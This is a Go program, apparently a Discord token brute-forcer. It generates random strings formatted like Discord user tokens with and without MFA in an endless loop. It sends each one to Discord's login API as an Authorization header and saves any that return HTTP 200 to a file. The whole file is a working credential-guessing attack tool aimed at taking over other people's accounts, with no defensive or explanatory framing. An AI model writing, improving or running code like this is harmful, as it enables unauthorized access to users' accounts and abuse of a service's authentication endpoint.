package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"time"

	"github.com/go-resty/resty/v2"
)

type Config struct {
	ValidTokensFile string `json:"ValidTokensFile"`
}

func main() {
	config, err := loadConfig("settings.json")
	if err != nil {
		fmt.Println("\x1b[95m[\x1b[91m!\x1b[95m] \x1b[97m\x1b[91m!\x1b[95m] \x1b[97mError loading configuration\x1b[95m:\x1b[97m", err)
		return
	}

	for {
		mfaToken := GenMfaToken()
		NonMfaToken := GenNonMfaToken()

		validMfaToken := checkToken(mfaToken)
		validNonMfaToken := checkToken(NonMfaToken)

		if validMfaToken {
			fmt.Println("\x1b[97m\x1b[92m+\x1b[95m] \x1b[92mValid NFA token\x1b[95m:\x1b[92m", mfaToken)
			appendTokenToFile(config.ValidTokensFile, mfaToken)
		} else {
			fmt.Println("\x1b[95m[\x1b[91m-\x1b[95m] \x1b[97mInvalid token\x1b[95m:\x1b[91m", mfaToken)
		}

		if validNonMfaToken {
			fmt.Println("\x1b[97m\x1b[92m+\x1b[95m] \x1b[92mValid Non-MFA token\x1b[95m:\x1b[92m", NonMfaToken)
			appendTokenToFile(config.ValidTokensFile, NonMfaToken)
		} else {
			fmt.Println("\x1b[95m[\x1b[91m-\x1b[95m] \x1b[97mInvalid token\x1b[95m:\x1b[91m", NonMfaToken)
		}

		time.Sleep(10 * time.Millisecond)
	}
}

func loadConfig(filename string) (*Config, error) {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var config Config
	err = json.Unmarshal(content, &config)
	if err != nil {
		return nil, err
	}

	return &config, nil
}

func GenMfaToken() string {
	const charset = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
	length := 84

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return "mfa." + string(b)
}

func GenNonMfaToken() string {
	const charset = "ODgyODkxNjE4NDczMDkxMDgyYUW2-gduZXhSN1RwE06PFEHRQkehmNdpw"
	length := 24

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func checkToken(token string) bool {
	client := resty.New()
	resp, err := client.R().
		SetHeader("Authorization", token).
		Get("https://discord.com/api/v6/auth/login")

	if err != nil {
		return false
	}

	if resp.StatusCode() == 200 {
		return true
	}

	return false
}

func appendTokenToFile(filename, token string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("\x1b[95m[\x1b[91m!\x1b[95m] \x1b[97m\x1b[91m!\x1b[95m] \x1b[97mError opening file\x1b[95m:\x1b[97m", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(token + "\n"); err != nil {
		fmt.Println("\x1b[95m[\x1b[91m!\x1b[95m] \x1b[97m\x1b[91m!\x1b[95m] \x1b[97mError writing to file\x1b[95m:\x1b[97m", err)
		return
	}
}
